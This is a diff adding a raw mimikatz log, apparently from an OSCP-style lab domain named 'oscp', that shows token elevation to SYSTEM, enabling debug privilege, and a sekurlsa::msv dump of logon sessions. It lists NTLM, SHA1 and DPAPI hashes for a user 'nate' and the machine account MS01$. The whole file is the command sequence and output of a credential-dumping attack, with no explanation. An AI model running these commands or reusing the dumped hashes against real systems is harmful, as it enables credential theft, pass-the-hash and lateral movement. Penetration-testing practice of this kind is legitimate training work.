@@ -1,0 +1,214 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+1176	{0;000003e7} 0 D 76192     	NT AUTHORITY\SYSTEM	S-1-5-18	(15g,28p)	Impersonation (Impersonation)
+ -> Impersonated !
+ * Process Token : {0;00377ba7} 2 F 4563959   	oscp\nate	S-1-5-21-395943061-4281203283-1985023469-1106	(14g,24p)	Primary
+ * Thread Token  : {0;000003e7} 0 D 4604105   	NT AUTHORITY\SYSTEM	S-1-5-18	(15g,28p)	Impersonation (Impersonation)
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::msv
+
+Authentication Id : 0 ; 3636250 (00000000:00377c1a)
+Session           : RemoteInteractive from 2
+User Name         : nate
+Domain            : oscp
+Logon Server      : DC01
+Logon Time        : 5/19/2024 10:38:18 PM
+SID               : S-1-5-21-395943061-4281203283-1985023469-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : nate
+	 * Domain   : oscp
+	 * NTLM     : abc7186b67bf9833c6219e2ef80501ac
+	 * SHA1     : a81ab821baedaabd3867a2d258f40a3d22d3f583
+	 * DPAPI    : dc074f35e3a8b3ed0b2b31ac026ea634
+
+Authentication Id : 0 ; 3636135 (00000000:00377ba7)
+Session           : RemoteInteractive from 2
+User Name         : nate
+Domain            : oscp
+Logon Server      : DC01
+Logon Time        : 5/19/2024 10:38:18 PM
+SID               : S-1-5-21-395943061-4281203283-1985023469-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : nate
+	 * Domain   : oscp
+	 * NTLM     : abc7186b67bf9833c6219e2ef80501ac
+	 * SHA1     : a81ab821baedaabd3867a2d258f40a3d22d3f583
+	 * DPAPI    : dc074f35e3a8b3ed0b2b31ac026ea634
+
+Authentication Id : 0 ; 159548 (00000000:00026f3c)
+Session           : Service from 0
+User Name         : nate
+Domain            : oscp
+Logon Server      : DC01
+Logon Time        : 10/31/2023 8:54:36 AM
+SID               : S-1-5-21-395943061-4281203283-1985023469-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : nate
+	 * Domain   : oscp
+	 * NTLM     : abc7186b67bf9833c6219e2ef80501ac
+	 * SHA1     : a81ab821baedaabd3867a2d258f40a3d22d3f583
+	 * DPAPI    : dc074f35e3a8b3ed0b2b31ac026ea634
+
+Authentication Id : 0 ; 46655 (00000000:0000b63f)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 46615 (00000000:0000b617)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 3615983 (00000000:00372cef)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/19/2024 10:38:17 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 76546 (00000000:00012b02)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 45333 (00000000:0000b115)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:22 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MS01$
+Domain            : oscp
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:22 AM
+SID               : S-1-5-18
+	msv :	
+
+Authentication Id : 0 ; 3616015 (00000000:00372d0f)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/19/2024 10:38:17 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MS01$
+Domain            : oscp
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 3614144 (00000000:003725c0)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/19/2024 10:38:17 PM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-19
+	msv :	
+
+Authentication Id : 0 ; 76564 (00000000:00012b14)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : e91b56fb26b2d20a0bb6471d4fb9433d
+	 * SHA1     : d1d355b5f0cb4f8e1e430c072c21ec51029fd573
+
+mimikatz(commandline) # exit
+Bye!
